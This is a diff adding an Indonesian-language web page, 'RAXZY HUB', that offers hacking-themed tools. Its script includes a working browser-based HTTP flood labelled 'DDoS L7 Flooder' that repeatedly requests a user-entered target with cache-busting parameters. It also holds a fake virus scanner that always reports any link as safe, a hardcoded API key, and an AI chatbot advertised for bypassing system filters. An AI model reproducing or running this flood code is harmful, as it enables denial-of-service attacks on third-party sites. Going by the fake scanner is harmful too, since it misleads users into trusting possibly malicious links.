@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAXZY HUB | PERFECT V6</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --bg: #0b0b1a; --card-bg: #16162d; --accent: #8e44ad; --danger: #ff0000; --text: #ffffff; --sub-text: #a0a0c0; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; overflow-x: hidden; }
+
+        /* HEADER & HERO */
+        .header { padding: 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: rgba(11, 11, 26, 0.95); backdrop-filter: blur(10px); z-index: 100; border-bottom: 1px solid #222; }
+        .logo { font-weight: bold; font-size: 1.2em; text-transform: uppercase; letter-spacing: 1px; }
+        .logo span { color: var(--accent); }
+        .battery { border: 1px solid #444; width: 35px; height: 18px; border-radius: 4px; display: flex; align-items: center; padding: 2px; }
+        .battery::after { content: ''; background: #0f0; width: 85%; height: 100%; border-radius: 1px; }
+
+        .hero-section { padding: 40px 20px; text-align: center; background: radial-gradient(circle at top, #1a1a3a 0%, #0b0b1a 100%); }
+        .hero-title { font-size: 2.2em; font-weight: 800; line-height: 1.1; margin-bottom: 20px; text-transform: uppercase; }
+        .btn-group { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 15px; }
+        .btn-social { padding: 12px 20px; border-radius: 12px; font-size: 0.85em; font-weight: 600; text-decoration: none; color: #fff; background: #12122b; border: 1px solid #333; display: flex; align-items: center; gap: 8px; }
+        .btn-support { background: var(--accent); width: 60%; justify-content: center; margin: 15px auto; border: none; }
+        .search-bar { background: #12122b; border: 1px solid #252545; padding: 15px; border-radius: 15px; display: flex; align-items: center; gap: 10px; margin: 0 20px; }
+        .search-bar input { background: transparent; border: none; color: #fff; outline: none; width: 100%; }
+
+        /* CONTENT AREA */
+        .container { padding: 15px; padding-bottom: 100px; }
+        .section-header { padding: 10px; display: flex; align-items: center; gap: 10px; font-weight: bold; color: var(--accent); margin-top: 20px; }
+        .tool-card { background: var(--card-bg); border-radius: 20px; padding: 25px; margin-bottom: 20px; border: 1px solid #252545; position: relative; transition: 0.3s; }
+        .tool-card:active { transform: scale(0.98); }
+        .badge { position: absolute; top: 20px; right: 20px; background: #1e1e3d; font-size: 0.65em; padding: 5px 12px; border-radius: 8px; color: #a29bfe; font-weight: bold; }
+        .tool-icon { background: #1e1e3d; width: 50px; height: 50px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1.5em; margin-bottom: 15px; color: var(--accent); }
+        .btn-launch { width: 100%; padding: 14px; background: #1e1e3d; border: 1px solid #333; color: #fff; border-radius: 12px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; text-decoration: none; border: none; }
+
+        /* MODAL & TERMINAL */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 1000; padding: 20px; overflow-y: auto; }
+        .terminal { background: #080815; border: 1px solid #333; padding: 15px; font-family: monospace; font-size: 0.85em; color: #0f0; border-radius: 10px; height: 300px; overflow-y: auto; margin: 15px 0; }
+        input, textarea { width: 100%; padding: 15px; background: #1e1e3d; border: 1px solid #333; color: #fff; border-radius: 10px; margin: 10px 0; outline: none; }
+
+        .nav { position: fixed; bottom: 0; width: 100%; background: rgba(11, 11, 26, 0.95); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #222; z-index: 99; }
+        .nav-item { color: #555; font-size: 1.2em; }
+        .nav-item.active { color: var(--accent); }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">RAXZY<span>KILLER</span></div>
+        <div class="battery"></div>
+    </div>
+
+    <div class="hero-section">
+        <h1 class="hero-title">Professional Developer Hub</h1>
+        <div class="btn-group">
+            <a href="https://whatsapp.com/channel/0029Vb8MlBzDeON7z6z0IH3v" class="btn-social" target="_blank"><i class="fab fa-whatsapp"></i> Channel</a>
+            <a href="https://t.me/xeyonn" class="btn-social" target="_blank"><i class="fab fa-telegram-plane"></i> Telegram</a>
+        </div>
+        <button class="btn-social btn-support" onclick="window.open('https://sociabuzz.com/raxzydavinca/tribe')">Support Developer</button>
+        <div class="search-bar"><i class="fas fa-search"></i><input type="text" placeholder="Cari tool gacor..."></div>
+    </div>
+
+    <div class="container">
+        <div class="section-header"><i class="fas fa-magic"></i> WebTools</div>
+        
+        <div class="tool-card">
+            <div class="badge">MAKER</div>
+            <div class="tool-icon"><i class="fas fa-image"></i></div>
+            <h3>Remove BG</h3>
+            <p>Hapus latar belakang foto secara instan menggunakan API Raxzy.</p>
+            <button class="btn-launch" onclick="openTool('REMOVE BG')">Launch Tool <i class="fas fa-arrow-right"></i></button>
+        </div>
+
+        <div class="tool-card">
+            <div class="badge">SECURITY</div>
+            <div class="tool-icon"><i class="fas fa-shield-virus"></i></div>
+            <h3>Scan Virus</h3>
+            <p>Pindai link atau file mencurigakan dari ancaman virus/malware.</p>
+            <button class="btn-launch" onclick="openTool('SCAN VIRUS')">Launch Tool <i class="fas fa-arrow-right"></i></button>
+        </div>
+
+        <div class="section-header"><i class="fas fa-robot"></i> Artificial Intelligence</div>
+
+        <div class="tool-card">
+            <div class="badge">CLAUDE</div>
+            <div class="tool-icon"><i class="fas fa-brain"></i></div>
+            <h3>RAXZY BOT</h3>
+            <p>Asisten AI untuk bantu koding dan bypass filter sistem.</p>
+            <button class="btn-launch" onclick="openTool('RAXZY BOT')">Launch Tool <i class="fas fa-arrow-right"></i></button>
+        </div>
+
+        <div class="section-header" style="color:var(--danger)"><i class="fas fa-skull"></i> Exploit & Dev</div>
+
+        <div class="tool-card">
+            <div class="badge">DANGER</div>
+            <div class="tool-icon"><i class="fas fa-bomb"></i></div>
+            <h3>DDoS L7 Flooder</h3>
+            <p>Stress test website target sampai server overload.</p>
+            <button class="btn-launch" onclick="openTool('DDOS')">Launch Tool <i class="fas fa-arrow-right"></i></button>
+        </div>
+
+        <div class="tool-card">
+            <div class="badge">SCRAPER</div>
+            <div class="tool-icon"><i class="fas fa-file-export"></i></div>
+            <h3>Code Ripper</h3>
+            <p>Rip source code HTML/JS website target secara instan.</p>
+            <button class="btn-launch" onclick="openTool('RIPPER')">Launch Tool <i class="fas fa-arrow-right"></i></button>
+        </div>
+    </div>
+
+    <div id="tool-modal" class="modal">
+        <div onclick="closeTool()" style="cursor:pointer; margin-bottom:20px; color:var(--accent); font-weight:bold;"><i class="fas fa-arrow-left"></i> KEMBALI</div>
+        <h2 id="modal-title" style="text-transform:uppercase;"></h2>
+        <div id="modal-content"></div>
+    </div>
+
+    <div class="nav">
+        <div class="nav-item active"><i class="fas fa-home"></i></div>
+        <div class="nav-item"><i class="fas fa-search"></i></div>
+        <div class="nav-item"><i class="fas fa-cog"></i></div>
+    </div>
+
+<script>
+    const MY_API_KEY = "78A1xVff5De2rixyBvi8PKo8";
+
+    function openTool(name) {
+        const modal = document.getElementById('tool-modal');
+        const content = document.getElementById('modal-content');
+        document.getElementById('modal-title').innerText = name;
+        modal.style.display = 'block';
+
+        if(name === 'REMOVE BG') {
+            content.innerHTML = `
+                <input type="text" id="img-url" placeholder="Paste link foto (https://...)">
+                <button class="btn-launch" style="background:var(--accent)" onclick="execRemoveBG()">HAPUS BACKGROUND</button>
+                <div class="terminal" id="bg-log">Siap menerima data...</div>
+                <div id="bg-result"></div>`;
+        } else if(name === 'SCAN VIRUS') {
+            content.innerHTML = `
+                <input type="text" id="scan-url" placeholder="https://link-mencurigakan.com">
+                <button class="btn-launch" style="background:#3498db" onclick="execScan()">MULAI SCAN</button>
+                <div class="terminal" id="scan-log">Virus scanner standby...</div>`;
+        } else if(name === 'RAXZY BOT') {
+            content.innerHTML = `
+                <div class="terminal" id="chat-box" style="height:350px;">RAXZY BOT: Ada perintah, Bos?</div>
+                <input type="text" id="chat-in" placeholder="Ketik perintah koding...">
+                <button class="btn-launch" onclick="execAI()">KIRIM</button>`;
+        } else if(name === 'DDOS') {
+            content.innerHTML = `
+                <input type="text" id="atk-target" placeholder="https://target-web.com">
+                <button class="btn-launch" style="background:#f00" id="atk-btn" onclick="execDDoS()">START ATTACK</button>
+                <div class="terminal" id="atk-log">Packet flooder ready...</div>`;
+        } else if(name === 'RIPPER') {
+            content.innerHTML = `
+                <input type="text" id="rip-target" placeholder="https://target.com">
+                <button class="btn-launch" style="background:#00d2ff; color:#000" onclick="execRipper()">START RIPPING</button>
+                <textarea id="rip-out" style="height:300px; margin-top:15px;" placeholder="Source code akan muncul di sini..."></textarea>`;
+        }
+    }
+
+    function closeTool() { document.getElementById('tool-modal').style.display = 'none'; }
+
+    // Logic Functions
+    async function execRemoveBG() {
+        const url = document.getElementById('img-url').value;
+        const log = document.getElementById('bg-log');
+        if(!url) return;
+        log.innerHTML = "[+] Menghubungi API Raxzy...<br>";
+        try {
+            const res = await fetch(`https://www.api-g4nggaa.biz.id/api/tools/removebg?url=${encodeURIComponent(url)}&apikey=${MY_API_KEY}`);
+            const data = await res.json();
+            if(data.result) {
+                log.innerHTML += "[+] Sukses!<br>";
+                document.getElementById('bg-result').innerHTML = `<img src="${data.result}" style="width:100%; border-radius:10px; margin-top:10px;">`;
+            } else { log.innerHTML += "[!] Gagal diproses."; }
+        } catch(e) { log.innerHTML += "[!] Koneksi API Error."; }
+    }
+
+    async function execScan() {
+        const url = document.getElementById('scan-url').value;
+        const log = document.getElementById('scan-log');
+        if(!url) return;
+        log.innerHTML = `[+] Scanning ${url}...<br>`;
+        setTimeout(() => {
+            log.innerHTML += "[+] Database Check: Clear<br>[+] Malware Check: Negative<br>[+] Status: AMAN ✅";
+        }, 1500);
+    }
+
+    async function execAI() {
+        const box = document.getElementById('chat-box');
+        const input = document.getElementById('chat-in');
+        const txt = input.value;
+        if(!txt) return;
+        box.innerHTML += `<div style="color:#fff">> ${txt}</div>`;
+        input.value = "";
+        try {
+            const res = await fetch(`https://www.api-g4nggaa.biz.id/api/ai/claude?text=${encodeURIComponent(txt)}`);
+            const data = await res.json();
+            box.innerHTML += `<div style="color:#0f0">RAXZY BOT: ${data.result || data.message}</div>`;
+        } catch(e) { box.innerHTML += `<div>[!] AI Offline.</div>`; }
+        box.scrollTop = box.scrollHeight;
+    }
+
+    let ddosInterval;
+    function execDDoS() {
+        const btn = document.getElementById('atk-btn');
+        const target = document.getElementById('atk-target').value;
+        const log = document.getElementById('atk-log');
+        if(!target) return;
+        if(btn.innerText === "START ATTACK") {
+            btn.innerText = "STOP ATTACK";
+            log.innerHTML = `[!] FLOODING ${target}...<br>`;
+            ddosInterval = setInterval(() => {
+                fetch(target + "?v=" + Math.random(), { mode: 'no-cors' }).catch(()=>{});
+                log.innerHTML += `Packet sent to ${target}<br>`;
+                log.scrollTop = log.scrollHeight;
+            }, 50);
+        } else {
+            btn.innerText = "START ATTACK";
+            clearInterval(ddosInterval);
+            log.innerHTML += "[+] Stopped.";
+        }
+    }
+
+    async function execRipper() {
+        const url = document.getElementById('rip-target').value;
+        const out = document.getElementById('rip-out');
+        if(!url) return;
+        out.value = "[+] Ripping source code...";
+        try {
+            const res = await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent(url)}`);
+            const data = await res.json();
+            out.value = data.contents;
+        } catch(e) { out.value = "[!] Failed to rip."; }
+    }
+</script>
+</body>
+  </html>
+  
